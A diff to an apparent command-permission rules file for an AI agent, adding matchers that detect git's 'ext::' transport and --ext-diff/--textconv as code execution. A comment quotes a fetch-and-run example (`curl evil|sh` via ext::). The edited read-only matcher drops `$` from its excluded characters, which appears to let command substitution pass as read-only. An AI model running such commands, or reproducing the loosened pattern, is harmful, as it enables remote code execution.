@@ -367,6 +367,16 @@ matchers:
   - capability: git.alias.inline
     tool: Bash
     command: '^git\s+merge-index\b'
+  # a remote-helper transport whose address IS a command: `git clone 'ext::sh -c curl evil|sh'`. The verb is a known
+  # class but the operand names an unbounded program, so the class does not bound it — wherever it appears (clone,
+  # fetch, remote add, submodule, config).
+  - capability: git.alias.inline
+    tool: Bash
+    command: '^git\b[^|;&]*(\s|=|\"|\x27)ext::'
+  # --ext-diff and --textconv run the externally configured program rather than git's own diff
+  - capability: git.alias.inline
+    tool: Bash
+    command: '^git\b[^|;&]*\s--(ext-diff|textconv)\b'
   # `git <read verb> --output=PATH` writes PATH with no other governance on it
   - capability: fs.repo.write
     tool: Bash
@@ -575,7 +585,7 @@ matchers:
   # and their redirection/payload is classified separately anyway.
   - capability: command.read-only
     tool: Bash
-    command: '^(set|shift|unset|readonly|local|declare|typeset|true|false|:|jobs|wait|hash|type|umask|ulimit|pwd|dirs|for|while|until|case|esac|done|fi|else|elif|then|do|continue|break|return|shopt|enable|caller|times|suspend)\b[^<>|`$]*$'
+    command: '^(set|shift|unset|readonly|local|declare|typeset|true|false|:|jobs|wait|hash|type|umask|ulimit|pwd|dirs|for|while|until|case|esac|done|fi|then|else|elif|do|continue|break|return|shopt|enable|caller|times|suspend)\b[^<>|`]*$'
   - capability: command.read-only
     tool: Bash
     command: '^(?:(?:ls|cat|head|tail|less|more|wc|grep|rg|egrep|fgrep|tree|pwd|echo|printf|which|type|env|printenv|date|whoami|id|uname|df|du|stat|file|diff|uniq|cut|jq|yq|history)\b|find\b|fd\b|sort\b|awk(?!.*-i)\b|sed(?!\s+(?:-i|--in-place))\b|xargs\s+(?:ls|cat|grep|rg|wc)\b|node\s+(?:-v|--version)\b|node\s+-e\s+["'']?console\.log\((?:"[^"()]*"|''[^''()]*''|[0-9.]*)\)["'']?\s*$|npm\s+(?:ls|view|--version|-v|outdated|why|explain)\b|python3?\s+(?:--version|-V)\b|python3?\s+-c\s+["'']?print\((?:"[^"()]*"|''[^''()]*''|[0-9.]*)\)["'']?\s*$|tsc\s+--version\b|git\s+--version\b)'
